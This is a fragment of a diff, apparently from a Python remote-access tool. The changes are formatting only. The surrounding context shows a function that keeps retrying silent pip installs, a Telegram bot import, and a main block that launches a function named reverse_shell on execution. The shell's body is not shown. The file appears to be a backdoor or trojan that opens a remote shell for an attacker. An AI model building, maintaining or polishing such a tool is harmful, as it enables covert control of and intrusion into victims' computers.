@@ -1140,12 +1140,14 @@ def install_package(package_name):
     """
     while True:
         try:
-            subprocess.run(["pip", "install", package_name], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True)
+            subprocess.run(["pip", "install", package_name], stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                           check=True)
             break
         except subprocess.CalledProcessError:
             continue
         except Exception:
             continue
+
 
 def reverse_shell():
     """
@@ -1170,5 +1172,6 @@ if __name__ == "__main__":
     import telepot
     import threading
     import shutil
+
     # Start the shell
     reverse_shell()
